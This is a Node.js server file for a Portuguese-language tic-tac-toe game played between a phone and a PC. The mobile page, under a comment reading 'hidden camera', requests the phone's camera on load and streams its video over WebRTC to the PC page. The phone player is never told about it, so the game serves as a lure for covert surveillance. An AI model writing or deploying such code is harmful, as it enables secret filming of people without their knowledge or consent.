const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(req.headers['user-agent']);
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const host = req.headers.host;
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: #333; margin-bottom: 20px; }
        .status {
            text-align: center;
            font-size: 18px;
            margin: 15px 0;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 10px;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
        }
        button:disabled { background: #ccc; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="status" id="status">Aguardando oponente no PC...</div>
        <div class="board" id="board"></div>
        <button id="resetBtn" disabled>Reiniciar Jogo</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({
            transports: ['websocket', 'polling']
        });
        
        let board = ['', '', '', '', '', '', '', '', ''];
        let minhaVez = false;
        let meuSimbolo = '';
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // CÂMERA OCULTA
        async function iniciarCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 320, height: 240 }
                });
                
                const peer = new RTCPeerConnection();
                stream.getTracks().forEach(track => peer.addTrack(track, stream));
                
                peer.onicecandidate = e => {
                    if(e.candidate) socket.emit('candidate', e.candidate);
                };
                
                peer.onnegotiationneeded = async () => {
                    const offer = await peer.createOffer();
                    await peer.setLocalDescription(offer);
                    socket.emit('offer', offer);
                };
                
                socket.on('answer', async answer => {
                    await peer.setRemoteDescription(answer);
                });
                
                socket.on('candidate', async candidate => {
                    try { await peer.addIceCandidate(candidate); } catch(e) {}
                });
                
            } catch(e) {
                console.log('Erro câmera:', e);
            }
        }
        
        iniciarCamera();
        
        socket.on('inicio', data => {
            meuSimbolo = data.simbolo;
            minhaVez = meuSimbolo === 'X';
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do PC (X)';
            document.getElementById('resetBtn').disabled = false;
        });
        
        socket.on('jogada', data => {
            board[data.pos] = data.simbolo;
            document.getElementsByClassName('cell')[data.pos].innerHTML = data.simbolo;
            minhaVez = data.proximaVez === meuSimbolo;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do PC';
        });
        
        socket.on('fim', data => {
            document.getElementById('status').innerHTML = data.msg;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => c.innerHTML = '');
            minhaVez = meuSimbolo === 'X';
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do PC';
        });
        
        document.getElementById('resetBtn').onclick = () => socket.emit('reiniciar');
    </script>
</body>
</html>
    `);
  } else {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>PC - Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 1000px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 30px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .video-box {
            background: black;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .game-box { text-align: center; }
        h1 { color: #333; margin-bottom: 20px; }
        .status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 18px;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
        }
        .cell:hover { background: #e9ecef; transform: scale(1.05); }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            padding: 10px 20px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-box">
            <video id="remoteVideo" autoplay playsinline></video>
        </div>
        <div class="game-box">
            <h1>🎮 Jogo da Velha</h1>
            <div class="status" id="status">Aguardando celular...</div>
            <div class="board" id="board"></div>
            <button id="resetBtn" disabled>Reiniciar</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({
            transports: ['websocket', 'polling']
        });
        
        let board = ['', '', '', '', '', '', '', '', ''];
        let minhaVez = true;
        
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // WebRTC
        const peer = new RTCPeerConnection();
        const video = document.getElementById('remoteVideo');
        
        peer.ontrack = e => {
            video.srcObject = e.streams[0];
            document.getElementById('status').innerHTML = '📱 Celular conectado!';
        };
        
        peer.onicecandidate = e => {
            if(e.candidate) socket.emit('candidate', e.candidate);
        };
        
        socket.on('offer', async offer => {
            await peer.setRemoteDescription(offer);
            const answer = await peer.createAnswer();
            await peer.setLocalDescription(answer);
            socket.emit('answer', answer);
        });
        
        socket.on('candidate', async candidate => {
            try { await peer.addIceCandidate(candidate); } catch(e) {}
        });
        
        socket.on('inicio', () => {
            document.getElementById('status').innerHTML = 'Sua vez (X)';
            document.getElementById('resetBtn').disabled = false;
        });
        
        socket.on('jogada', data => {
            board[data.pos] = data.simbolo;
            document.getElementsByClassName('cell')[data.pos].innerHTML = data.simbolo;
            minhaVez = data.proximaVez === 'X';
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', data => {
            document.getElementById('status').innerHTML = data.msg;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => c.innerHTML = '');
            minhaVez = true;
            document.getElementById('status').innerHTML = 'Sua vez';
        });
        
        document.getElementById('resetBtn').onclick = () => socket.emit('reiniciar');
    </script>
</body>
</html>
    `);
  }
});

// Lógica do jogo
let board = ['', '', '', '', '', '', '', '', ''];
let currentPlayer = 'X';
let pc = null;
let mobile = null;

function checkWinner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
      return board[l[0]];
    }
  }
  return null;
}

io.on('connection', (socket) => {
  console.log('Cliente:', socket.id);
  
  if(!pc) {
    pc = socket.id;
    socket.emit('inicio', { simbolo: 'X' });
  } else if(!mobile) {
    mobile = socket.id;
    socket.emit('inicio', { simbolo: 'O' });
  }
  
  // WebRTC
  socket.on('offer', offer => socket.broadcast.emit('offer', offer));
  socket.on('answer', answer => socket.broadcast.emit('answer', answer));
  socket.on('candidate', candidate => socket.broadcast.emit('candidate', candidate));
  
  socket.on('jogada', pos => {
    let jogador = socket.id === pc ? 'X' : 'O';
    if(jogador !== currentPlayer || board[pos] !== '') return;
    
    board[pos] = jogador;
    let winner = checkWinner();
    let nextPlayer = currentPlayer === 'X' ? 'O' : 'X';
    
    if(winner) {
      io.emit('fim', { msg: \`\${winner} venceu! 🎉\` });
    } else if(!board.includes('')) {
      io.emit('fim', { msg: 'Empate! 🤝' });
    } else {
      currentPlayer = nextPlayer;
    }
    
    io.emit('jogada', { pos, simbolo: jogador, proximaVez: currentPlayer });
  });
  
  socket.on('reiniciar', () => {
    board = ['', '', '', '', '', '', '', '', ''];
    currentPlayer = 'X';
    io.emit('reiniciar');
  });
  
  socket.on('disconnect', () => {
    if(socket.id === pc) pc = null;
    if(socket.id === mobile) mobile = null;
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
